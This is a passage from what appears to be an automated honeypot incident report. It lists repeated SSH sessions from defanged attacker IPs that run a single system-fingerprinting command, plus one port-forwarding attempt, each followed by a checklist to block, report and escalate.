- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c455e36891d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:57 |
| **Last Seen** | 2026-07-24 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:57:34` | `cowrie.session.connect` |
| `2026-07-24 14:57:34` | `cowrie.client.version` |
| `2026-07-24 14:57:34` | `cowrie.client.kex` |
| `2026-07-24 14:57:34` | `cowrie.login.success` |
| `2026-07-24 14:57:35` | `cowrie.session.params` |
| `2026-07-24 14:57:35` | `cowrie.command.input` |
| `2026-07-24 14:57:35` | `cowrie.log.closed` |
| `2026-07-24 14:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40595dd9371d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:57 |
| **Last Seen** | 2026-07-24 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:57:41` | `cowrie.session.connect` |
| `2026-07-24 14:57:41` | `cowrie.client.version` |
| `2026-07-24 14:57:41` | `cowrie.client.kex` |
| `2026-07-24 14:57:42` | `cowrie.login.success` |
| `2026-07-24 14:57:42` | `cowrie.session.params` |
| `2026-07-24 14:57:42` | `cowrie.command.input` |
| `2026-07-24 14:57:43` | `cowrie.log.closed` |
| `2026-07-24 14:57:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad4cf1720e85

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:57 |
| **Last Seen** | 2026-07-24 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:57:48` | `cowrie.session.connect` |
| `2026-07-24 14:57:48` | `cowrie.client.version` |
| `2026-07-24 14:57:49` | `cowrie.client.kex` |
| `2026-07-24 14:57:49` | `cowrie.login.success` |
| `2026-07-24 14:57:50` | `cowrie.session.params` |
| `2026-07-24 14:57:50` | `cowrie.command.input` |
| `2026-07-24 14:57:50` | `cowrie.log.closed` |
| `2026-07-24 14:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74583bb40b70

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:57 |
| **Last Seen** | 2026-07-24 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:57:55` | `cowrie.session.connect` |
| `2026-07-24 14:57:55` | `cowrie.client.version` |
| `2026-07-24 14:57:55` | `cowrie.client.kex` |
| `2026-07-24 14:57:56` | `cowrie.login.success` |
| `2026-07-24 14:57:57` | `cowrie.session.params` |
| `2026-07-24 14:57:57` | `cowrie.command.input` |
| `2026-07-24 14:57:57` | `cowrie.log.closed` |
| `2026-07-24 14:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f416a8594d30

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:58 |
| **Last Seen** | 2026-07-24 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:58:02` | `cowrie.session.connect` |
| `2026-07-24 14:58:02` | `cowrie.client.version` |
| `2026-07-24 14:58:02` | `cowrie.client.kex` |
| `2026-07-24 14:58:03` | `cowrie.login.success` |
| `2026-07-24 14:58:04` | `cowrie.session.params` |
| `2026-07-24 14:58:04` | `cowrie.command.input` |
| `2026-07-24 14:58:04` | `cowrie.log.closed` |
| `2026-07-24 14:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d838dea1e2c9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:58 |
| **Last Seen** | 2026-07-24 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:58:09` | `cowrie.session.connect` |
| `2026-07-24 14:58:09` | `cowrie.client.version` |
| `2026-07-24 14:58:10` | `cowrie.client.kex` |
| `2026-07-24 14:58:10` | `cowrie.login.success` |
| `2026-07-24 14:58:11` | `cowrie.session.params` |
| `2026-07-24 14:58:11` | `cowrie.command.input` |
| `2026-07-24 14:58:11` | `cowrie.log.closed` |
| `2026-07-24 14:58:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92c3bf84255b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:58 |
| **Last Seen** | 2026-07-24 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:58:16` | `cowrie.session.connect` |
| `2026-07-24 14:58:16` | `cowrie.client.version` |
| `2026-07-24 14:58:16` | `cowrie.client.kex` |
| `2026-07-24 14:58:17` | `cowrie.login.success` |
| `2026-07-24 14:58:17` | `cowrie.session.params` |
| `2026-07-24 14:58:17` | `cowrie.command.input` |
| `2026-07-24 14:58:18` | `cowrie.log.closed` |
| `2026-07-24 14:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8f48b1c5e37

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:58 |
| **Last Seen** | 2026-07-24 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:58:23` | `cowrie.session.connect` |
| `2026-07-24 14:58:23` | `cowrie.client.version` |
| `2026-07-24 14:58:23` | `cowrie.client.kex` |
| `2026-07-24 14:58:24` | `cowrie.login.success` |
| `2026-07-24 14:58:25` | `cowrie.session.params` |
| `2026-07-24 14:58:25` | `cowrie.command.input` |
| `2026-07-24 14:58:25` | `cowrie.log.closed` |
| `2026-07-24 14:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fbb2e463fcf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:58 |
| **Last Seen** | 2026-07-24 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:58:30` | `cowrie.session.connect` |
| `2026-07-24 14:58:30` | `cowrie.client.version` |
| `2026-07-24 14:58:30` | `cowrie.client.kex` |
| `2026-07-24 14:58:31` | `cowrie.login.success` |
| `2026-07-24 14:58:31` | `cowrie.session.params` |
| `2026-07-24 14:58:31` | `cowrie.command.input` |
| `2026-07-24 14:58:32` | `cowrie.log.closed` |
| `2026-07-24 14:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f4cb07b95b9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:58 |
| **Last Seen** | 2026-07-24 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:58:37` | `cowrie.session.connect` |
| `2026-07-24 14:58:37` | `cowrie.client.version` |
| `2026-07-24 14:58:37` | `cowrie.client.kex` |
| `2026-07-24 14:58:38` | `cowrie.login.success` |
| `2026-07-24 14:58:39` | `cowrie.session.params` |
| `2026-07-24 14:58:39` | `cowrie.command.input` |
| `2026-07-24 14:58:39` | `cowrie.log.closed` |
| `2026-07-24 14:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a0956e09de2

| Field | Detail |
|---|---|
| **Source IP** | `220.78.182[.]74` |
| **First Seen** | 2026-07-24 14:58 |
| **Last Seen** | 2026-07-24 14:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:58:40` | `cowrie.session.connect` |
| `2026-07-24 14:58:41` | `cowrie.client.version` |
| `2026-07-24 14:58:41` | `cowrie.client.kex` |
| `2026-07-24 14:58:43` | `cowrie.login.success` |
| `2026-07-24 14:58:44` | `cowrie.direct-tcpip.request` |
| `2026-07-24 14:58:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.78.182[.]74` to AbuseIPDB if not already reported
- [ ] Block `220.78.182[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3344310c8fa

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:58 |
| **Last Seen** | 2026-07-24 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:58:44` | `cowrie.session.connect` |
| `2026-07-24 14:58:44` | `cowrie.client.version` |
| `2026-07-24 14:58:44` | `cowrie.client.kex` |
| `2026-07-24 14:58:45` | `cowrie.login.success` |
| `2026-07-24 14:58:46` | `cowrie.session.params` |
| `2026-07-24 14:58:46` | `cowrie.command.input` |
| `2026-07-24 14:58:46` | `cowrie.log.closed` |
| `2026-07-24 14:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9beb10c2bc59

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:58 |
| **Last Seen** | 2026-07-24 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:58:51` | `cowrie.session.connect` |
| `2026-07-24 14:58:51` | `cowrie.client.version` |
| `2026-07-24 14:58:51` | `cowrie.client.kex` |
| `2026-07-24 14:58:52` | `cowrie.login.success` |
| `2026-07-24 14:58:52` | `cowrie.session.params` |
| `2026-07-24 14:58:52` | `cowrie.command.input` |
| `2026-07-24 14:58:52` | `cowrie.log.closed` |
| `2026-07-24 14:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be5ff97acf0d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:58 |
| **Last Seen** | 2026-07-24 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:58:58` | `cowrie.session.connect` |
| `2026-07-24 14:58:58` | `cowrie.client.version` |
| `2026-07-24 14:58:58` | `cowrie.client.kex` |
| `2026-07-24 14:58:59` | `cowrie.login.success` |
| `2026-07-24 14:59:00` | `cowrie.session.params` |
| `2026-07-24 14:59:00` | `cowrie.command.input` |
| `2026-07-24 14:59:00` | `cowrie.log.closed` |
| `2026-07-24 14:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f94886cdada6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:59 |
| **Last Seen** | 2026-07-24 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:59:05` | `cowrie.session.connect` |
| `2026-07-24 14:59:05` | `cowrie.client.version` |
| `2026-07-24 14:59:05` | `cowrie.client.kex` |
| `2026-07-24 14:59:06` | `cowrie.login.success` |
| `2026-07-24 14:59:06` | `cowrie.session.params` |
| `2026-07-24 14:59:06` | `cowrie.command.input` |
| `2026-07-24 14:59:06` | `cowrie.log.closed` |
| `2026-07-24 14:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f7fd0cf290b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:59 |
| **Last Seen** | 2026-07-24 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:59:12` | `cowrie.session.connect` |
| `2026-07-24 14:59:12` | `cowrie.client.version` |
| `2026-07-24 14:59:13` | `cowrie.client.kex` |
| `2026-07-24 14:59:13` | `cowrie.login.success` |
| `2026-07-24 14:59:14` | `cowrie.session.params` |
| `2026-07-24 14:59:14` | `cowrie.command.input` |
| `2026-07-24 14:59:14` | `cowrie.log.closed` |
| `2026-07-24 14:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ee17b3b773

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:59 |
| **Last Seen** | 2026-07-24 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:59:19` | `cowrie.session.connect` |
| `2026-07-24 14:59:19` | `cowrie.client.version` |
| `2026-07-24 14:59:20` | `cowrie.client.kex` |
| `2026-07-24 14:59:20` | `cowrie.login.success` |
| `2026-07-24 14:59:21` | `cowrie.session.params` |
| `2026-07-24 14:59:21` | `cowrie.command.input` |
| `2026-07-24 14:59:21` | `cowrie.log.closed` |
| `2026-07-24 14:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d772420ffe72

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:59 |
| **Last Seen** | 2026-07-24 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:59:27` | `cowrie.session.connect` |
| `2026-07-24 14:59:27` | `cowrie.client.version` |
| `2026-07-24 14:59:27` | `cowrie.client.kex` |
| `2026-07-24 14:59:27` | `cowrie.login.success` |
| `2026-07-24 14:59:28` | `cowrie.session.params` |
| `2026-07-24 14:59:28` | `cowrie.command.input` |
| `2026-07-24 14:59:28` | `cowrie.log.closed` |
| `2026-07-24 14:59:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9ce48d04707

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:59 |
| **Last Seen** | 2026-07-24 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:59:33` | `cowrie.session.connect` |
| `2026-07-24 14:59:33` | `cowrie.client.version` |
| `2026-07-24 14:59:33` | `cowrie.client.kex` |
| `2026-07-24 14:59:34` | `cowrie.login.success` |
| `2026-07-24 14:59:34` | `cowrie.session.params` |
| `2026-07-24 14:59:34` | `cowrie.command.input` |
| `2026-07-24 14:59:35` | `cowrie.log.closed` |
| `2026-07-24 14:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d921b8d0c907

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:59 |
| **Last Seen** | 2026-07-24 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:59:40` | `cowrie.session.connect` |
| `2026-07-24 14:59:40` | `cowrie.client.version` |
| `2026-07-24 14:59:40` | `cowrie.client.kex` |
| `2026-07-24 14:59:40` | `cowrie.login.success` |
| `2026-07-24 14:59:41` | `cowrie.session.params` |
| `2026-07-24 14:59:41` | `cowrie.command.input` |
| `2026-07-24 14:59:41` | `cowrie.log.closed` |
| `2026-07-24 14:59:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e5ec0bb8172

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:59 |
| **Last Seen** | 2026-07-24 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:59:46` | `cowrie.session.connect` |
| `2026-07-24 14:59:46` | `cowrie.client.version` |
| `2026-07-24 14:59:46` | `cowrie.client.kex` |
| `2026-07-24 14:59:47` | `cowrie.login.success` |
| `2026-07-24 14:59:48` | `cowrie.session.params` |
| `2026-07-24 14:59:48` | `cowrie.command.input` |
| `2026-07-24 14:59:48` | `cowrie.log.closed` |
| `2026-07-24 14:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7be606dedf4d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:59 |
| **Last Seen** | 2026-07-24 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:59:53` | `cowrie.session.connect` |
| `2026-07-24 14:59:53` | `cowrie.client.version` |
| `2026-07-24 14:59:53` | `cowrie.client.kex` |
| `2026-07-24 14:59:54` | `cowrie.login.success` |
| `2026-07-24 14:59:55` | `cowrie.session.params` |
| `2026-07-24 14:59:55` | `cowrie.command.input` |
| `2026-07-24 14:59:55` | `cowrie.log.closed` |
| `2026-07-24 14:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13ceda220eec

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:00 |
| **Last Seen** | 2026-07-24 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:00:01` | `cowrie.session.connect` |
| `2026-07-24 15:00:01` | `cowrie.client.version` |
| `2026-07-24 15:00:01` | `cowrie.client.kex` |
| `2026-07-24 15:00:01` | `cowrie.login.success` |
| `2026-07-24 15:00:02` | `cowrie.session.params` |
| `2026-07-24 15:00:02` | `cowrie.command.input` |
| `2026-07-24 15:00:02` | `cowrie.log.closed` |
| `2026-07-24 15:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a1f2b236e90

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:00 |
| **Last Seen** | 2026-07-24 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:00:08` | `cowrie.session.connect` |
| `2026-07-24 15:00:08` | `cowrie.client.version` |
| `2026-07-24 15:00:08` | `cowrie.client.kex` |
| `2026-07-24 15:00:08` | `cowrie.login.success` |
| `2026-07-24 15:00:09` | `cowrie.session.params` |
| `2026-07-24 15:00:09` | `cowrie.command.input` |
| `2026-07-24 15:00:09` | `cowrie.log.closed` |
| `2026-07-24 15:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15a6a6c1e6b4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:00 |
| **Last Seen** | 2026-07-24 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:00:15` | `cowrie.session.connect` |
| `2026-07-24 15:00:15` | `cowrie.client.version` |
| `2026-07-24 15:00:15` | `cowrie.client.kex` |
| `2026-07-24 15:00:16` | `cowrie.login.success` |
| `2026-07-24 15:00:17` | `cowrie.session.params` |
| `2026-07-24 15:00:17` | `cowrie.command.input` |
| `2026-07-24 15:00:17` | `cowrie.log.closed` |
| `2026-07-24 15:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e73072297f3a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:00 |
| **Last Seen** | 2026-07-24 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:00:22` | `cowrie.session.connect` |
